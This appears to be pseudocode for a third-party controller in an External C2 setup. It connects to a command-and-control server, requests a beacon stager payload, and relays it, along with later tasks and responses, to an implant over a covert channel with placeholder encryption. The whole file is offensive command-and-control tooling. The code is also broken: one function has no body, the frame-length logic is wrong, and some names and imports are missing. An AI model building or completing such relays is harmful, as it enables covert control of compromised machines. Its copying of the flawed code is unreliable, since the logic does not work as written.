# This is the pseudo code for the third-party client controller

# commonUtils will probably be the only class that the operator will need to modify.

# all frames start with  a 4-byte little-endian byte order integer. This integer is the length of the data within the frame. The frame data always follows this length value

# Imports we'll need
import struct
import socket

# Address of External c2 server
EXTERNAL_C2_ADDR = ""

# Port of external c2 server
EXTERNAL_C2_PORT = ""

# The name of the pipe that the beacon should use
C2_PIPE_NAME = ""

# A time in milliseconds that indicates how long the External C2 server should block when no new tasks are available
C2_BLOCK_TIME = 100

# Desired Architecture of the Beacon
C2_ARCH = "x64"

class commonUtils:
# This is the class for the common utilities used throughout the program
# 
# I opted for a going generic as possible on the task retrieveal, and sending of metadata as possible, 
#  so that it can be used for both parts, the staging of the payload, and during payload runtime. 
# However, for we should probably opt for handling those separately, 
#  so that different encoding/encryption schemes can be applied to data related to the stage, and data related to the running payload

	def createSocket():
		d = {}
		d['sock'] = socket.create_connection((EXTERNAL_C2_ADDR, int(EXTERNAL_C2_PORT)))
		d['state'] = 1
		return (d)

	# def sendFrameToC2(data):
	def sendFrameToC2(sock, chunk):
		# Send given data to the external_c2 in a frame

		slen = struct.unpack('<I', chunk)[0]
		sock.sendall(slen + chunk)

	def recvFrameFromC2(sock):
		# Receives frame from external_c2
		try:
			chunk = sock.recv(4)
		except:
			return None
		if len(chunk) < 4:
			return()
		slen = struct.unpack('<I', chunk)[0]
		chunk = sock.recv(slen)
		while len(chunk) < slen:
			chunk = chunk + sock.recv(slen - len(chunk))
		return chunk 

	def killSocket(sock):
		sock.close()

	def prepData(data):
		# This will prepare whatever data is given. Typically, this will mean that encoding and encryption will be done here
		# returns the processed data 
		encode_data = encodingScheme(data)
		encrypted_data = encryptionScheme(encode_data)

		return encrypted_data

	def decodeData(data):
		# This will attempt to decode whatever data is given to it. Typically, this will pretty much be the reverse of commonUtils.prepData()
		# returns the data in plain form
		decrypted_data = decryptionScheme(data)
		decoded_data = decodingScheme(decrypted_data)

		return decoded_data

	def retrieveData():
		# Basically, depends on your covert channel, but do whatever you need to do here to retrieve the next bit of data, and return that (decoded) data

		encoded_response = download(task_destination)

		decoded_data = self.decodeData(encoded_response)

		if decoded_data != Null:
			return decoded_data
		else: 
		# Probably do some error handling here instead of just returning Null
			return None

	def sendData(data):
		# Uploads the given data to your covert channel. Prepare the data, then send it.
		#
		# Return 0 on success
		# Now upload the already prepared data via covert channel.
		upload_status = upload(data)

		# if successful, return 0
		if upload_status == 0:
			return 0
		else:
			# Proper error checking would probably go here
			return None

class configureStage:
	def configureOptions(sock, arch, pipename, block):
		# send the options
		
		beacon_arch = "arch=" + str(arch)
		commonUtils.sendFrameToC2(sock, beacon_arch)

		beacon_pipename = "pipename=" + str(pipename)
		commonUtils.sendFrameToC2(sock, beacon_pipename)

		beacon_block = "block=" + str(block)
		commonUtils.sendFrameToC2(sock, beacon_block)

	def requestStager(sock):
		commonUtils.sendFrameToC2(sock, "go")

		stager_payload = commonUtils.recvFrameFromC2(sock)
		return stager_payload

	def main(sock):
		# Send the options to the external_c2 server
		self.configureOptions(sock, C2_ARCH, C2_PIPE_NAME, C2_BLOCK_TIME)

		# Request the stager from the external_c2 server
		stager_payload = self.requestStager(sock)

		# prepare the stager payload
		prep_stager = commonUtils.prepData(stager_payload)

		# Send the stager to the client
		commonUtils.sendData(prep_stager)

		# Retrieve the metadata we need to relay back to the server, will already be decoded
		metadata = commonUtils.retrieveData()

		# Send the metadata frame to the external_c2 server
		commonUtils.sendFrameToC2(sock, metadata)

		# Let's pretend we have some error handling that crashes the process if things go bad, else return 0

		return 0


class establishedSession:
	def checkForTasks(sock):
		recvdTask = None
		while recvdTask is None:
			taskCheck = commonUtils.recvFrameFromC2(sock)

			if taskCheck == None:
				# Sleep for x amount of time, if we didn't get anything. We should/will probably have this as a configurable constant. 
				# Restarts the loop
				sleep(5) 
			else: 
				# Our data is already decoded, end the loop by assigning it to recvdTask.
				recvdTask = taskCheck

		return recvdTask

	def checkForResponse(sock):
		recvdResponse = None
		while recvdResponse is None:
			respCheck = commonUtils.retrieveData() # will already be decoded
			if respCheck == None:
				# Sleep for x amount of time, if we didn't get anything. We should/will probably have this as a configurable constant. 
				# Restarts the loop
				sleep(5)
			else:
				recvdResponse = respCheck

		return recvdResponse 

	def relayResponse(sock):



def main():
	# Logic to setup the connection to the external_c2 server
	sock = commonUtils.createSocket()

	stager_status = configureStage.main(sock)

	if stager_status != 0:
		# Something went wrong
		sys.exit(1)

	# Now that the stager is configured and launched, let's start our main loop
	while True:
		newTask = establishedSession.checkForTasks(sock)

		# Once we have a new task, lets relay that to our client

		# start with preparing the newTask
		prep_newTask = commonUtils.prepData(newTask)

		# relay the prepared task to the client
		commonUtils.sendData(prep_newTask)

		# Now lets attempt to retrieve a response from the client
		b_response = establishedSession.checkForResponse(sock)

		# Let's relay the response to the external_c2 server
		commonUtils.sendFrameToC2(sock, b_response)

		# Restart the main execution loop

	# Now that things are set, let's close the socket to the external_c2 server
	commonUtils.killSocket(sock)

	# Exit normally
	sys.exit(0)
